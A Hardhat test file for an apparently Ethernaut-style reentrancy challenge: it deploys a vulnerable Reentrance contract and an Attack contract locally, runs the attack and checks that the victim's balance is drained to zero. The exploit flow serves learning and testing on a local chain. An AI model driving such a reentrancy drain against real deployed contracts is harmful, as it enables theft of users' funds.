import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract } from "ethers";
import { Attack, Reentrance } from "../typechain-types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { getContractAddress } from "ethers/lib/utils";
import exp from "constants";

describe("Reentrancy Exploit using Contract ", function () {
  let attackerContract: Attack,
    reentrantContract: Reentrance,
    attacker: SignerWithAddress,
    contractAddress: string,
    finalBalance: BigNumber;

  before("Setup for attack locally", async function () {
    [attacker] = await ethers.getSigners();
    //instance address of contract to attack

    // deploy reentrance contract
    const reentrantContractFactory = await ethers.getContractFactory(
      "Reentrance"
    );
    reentrantContract = await reentrantContractFactory.deploy();
    await reentrantContract.deployed();

    const attackContractFactory = await ethers.getContractFactory("Attack");

    attackerContract = await attackContractFactory.deploy(
      reentrantContract.address
    );

    await attackerContract.deployed();
  });
  // Replicate the state of ethernaut challenge
  it("Donate ethers from EOA", async function () {
    // donate to my attacker address
    let donateTx = await reentrantContract.donate(attacker.address, {
      value: ethers.utils.parseEther(".001"),
    });

    let donateReceipt = await donateTx.wait();

    console.log("The donate Receipt is ", donateReceipt);

    // check the balance of the attacker address
    let viewBalance = await reentrantContract.balanceOf(attacker.address);

    console.log("The balance of the attacker address is ", viewBalance);

    let balanceOfContract = await ethers.provider.getBalance(
      reentrantContract.address
    );

    console.log("balance in wei", balanceOfContract);
    let balanceInEthers = ethers.utils.formatEther(balanceOfContract);
    console.log("the balance of the reentrance contract is", balanceInEthers);
  });

  it("perform exploit", async function () {
    // // Attack flow

    // 1 Initiate the attack by calling our attack contract attack function

    let txAttack = await attackerContract.attack({
      value: ethers.utils.parseEther(".0001"),
    });

    let attackReceipt = await txAttack.wait();

    console.log("The attack receipt is: ", attackReceipt);

    finalBalance = await ethers.provider.getBalance(reentrantContract.address);
  });

  after("confirm exploit", async function () {
    // check that the reentrance contract == 0

    expect(finalBalance.toString()).to.be.eq("0");
  });
});
